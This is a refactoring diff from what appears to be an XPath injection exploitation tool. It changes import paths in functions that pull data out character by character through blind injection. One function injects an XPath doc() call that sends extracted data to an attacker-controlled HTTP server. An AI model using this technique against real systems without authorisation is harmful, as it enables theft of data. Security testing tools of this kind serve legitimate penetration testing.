@@ -2,20 +2,20 @@ import asyncio
 import base64
 import string as stdlib_string
 
-from xcat.xpath.fs import base_64_binary, write_binary
-from xcat.xpath.xpath_1 import (concat, normalize_space, string, string_length,
-                                substring_before)
-from xcat.xpath.xpath_2 import doc, encode_for_uri, string_to_codepoints
+from xpath import ROOT_NODE
+from xpath.functions import (concat, count, doc, encode_for_uri,
+                             normalize_space, string, string_length,
+                             string_to_codepoints, substring, substring_before)
+from xpath.functions.fs import base_64_binary, write_binary
 
 from .display import XMLNode
 from .requester import Requester
-from .xpath import ROOT_NODE, xpath_1
 
 ASCII_SEARCH_SPACE = stdlib_string.digits + stdlib_string.ascii_letters + '+./:@_ -,()!'
 MISSING_CHARACTER = "?"
 
 
-async def count(requester: Requester, expression, func=xpath_1.count):
+async def count(requester: Requester, expression, func=count):
     if requester.features['oob-http']:
         result = await get_string_via_oob(requester, string(func(expression)))
         if result is not None and result.isdigit():
@@ -70,7 +70,7 @@ async def get_string(requester: Requester, expression, disable_normalization=Fal
         else:
             pass
 
-    total_string_length = await count(requester, expression, func=xpath_1.string_length)
+    total_string_length = await count(requester, expression, func=string_length)
 
     if total_string_length == 0:
         return ""
@@ -83,9 +83,9 @@ async def get_string(requester: Requester, expression, disable_normalization=Fal
     fetch_length = total_string_length if not requester.fast else min(15, total_string_length)
 
     chars_futures = [
-        get_char(requester, xpath_1.substring(expression, i, 1))
+        get_char(requester, substring(expression, i, 1))
         for i in range(1, fetch_length + 1)
-        ]
+    ]
 
     chars = await asyncio.gather(*chars_futures)
 
@@ -122,7 +122,8 @@ async def get_string_via_oob(requester: Requester, expression):
     url, future = server.expect_data()
 
     if not await requester.check(
-                    doc(concat(f'{url}?d=', encode_for_uri(expression))) / 'data' == server.test_response_value):
+                            doc(concat(f'{url}?d=',
+                                       encode_for_uri(expression))) / 'data' == server.test_response_value):
         return None
 
     try:
@@ -148,7 +149,7 @@ async def get_all_text(requester: Requester, expression):
     text_contents = [
         string
         async for string in iterate_all(requester, expression.text(text_node_count))
-        ]
+    ]
 
     return "".join(text_contents)
 
